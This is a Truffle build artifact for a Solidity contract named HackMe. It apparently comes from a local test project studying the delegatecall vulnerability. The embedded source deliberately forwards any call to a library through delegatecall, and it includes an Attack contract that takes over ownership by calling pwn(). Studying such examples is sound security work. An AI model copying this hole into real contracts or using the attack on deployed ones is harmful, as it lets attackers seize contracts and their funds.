{
  "contractName": "HackMe",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "contract Lib",
          "name": "_lib",
          "type": "address"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "stateMutability": "payable",
      "type": "fallback",
      "payable": true
    },
    {
      "inputs": [],
      "name": "lib",
      "outputs": [
        {
          "internalType": "contract Lib",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [],
      "name": "owner",
      "outputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    }
  ],
  "bytecode": "0x608060405234801561001057600080fd5b5060405161042b38038061042b8339818101604052810190610032919061012e565b336000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555080600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505061015b565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60006100e9826100be565b9050919050565b60006100fb826100de565b9050919050565b61010b816100f0565b811461011657600080fd5b50565b60008151905061012881610102565b92915050565b600060208284031215610144576101436100b9565b5b600061015284828501610119565b91505092915050565b6102c18061016a6000396000f3fe60806040526004361061002d5760003560e01c80638da5cb5b146100bd57806392801230146100e85761002e565b5b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1660003660405161007892919061019c565b600060405180830381855af49150503d80600081146100b3576040519150601f19603f3d011682016040523d82523d6000602084013e6100b8565b606091505b505050005b3480156100c957600080fd5b506100d2610113565b6040516100df91906101f6565b60405180910390f35b3480156100f457600080fd5b506100fd610137565b60405161010a9190610270565b60405180910390f35b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b600081905092915050565b82818337600083830152505050565b6000610183838561015d565b9350610190838584610168565b82840190509392505050565b60006101a9828486610177565b91508190509392505050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60006101e0826101b5565b9050919050565b6101f0816101d5565b82525050565b600060208201905061020b60008301846101e7565b92915050565b6000819050919050565b600061023661023161022c846101b5565b610211565b6101b5565b9050919050565b60006102488261021b565b9050919050565b600061025a8261023d565b9050919050565b61026a8161024f565b82525050565b60006020820190506102856000830184610261565b9291505056fea26469706673582212205fd85abc0dac8f4722a99d382d4f6aa9e40759f31aaaf2700edd29e93697465264736f6c634300080b0033",
  "immutableReferences": {},
  "source": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.11;\n\ncontract Lib {\n    address public owner;\n\n    function pwn() public {\n        owner = msg.sender;\n    }\n}\n\ncontract HackMe {\n    address public owner;\n    Lib public lib;\n\n    constructor(Lib _lib) {\n        owner = msg.sender;\n        lib = Lib(_lib);\n    }\n\n    fallback() external payable {\n        address(lib).delegatecall(msg.data);\n    }\n}\n\ncontract Attack {\n    address public hackMe;\n\n    constructor(address _hackMe) {\n        hackMe = _hackMe;\n    }\n\n    function attack() public {\n        hackMe.call(abi.encodeWithSignature(\"pwn()\"));\n    }\n}\n",
  "sourcePath": "/home/shenjun/Desktop/tools/finance/truffle_test1/contracts/Delegatecall.sol",
  "compiler": {
    "name": "solc",
    "version": "0.8.11+commit.d7f03943.Emscripten.clang"
  },
  "schemaVersion": "3.4.16",
  "updatedAt": "2024-06-03T07:47:34.019Z",
  "networkType": "ethereum",
  "devdoc": {
    "kind": "dev",
    "methods": {},
    "version": 1
  },
  "userdoc": {
    "kind": "user",
    "methods": {},
    "version": 1
  }
}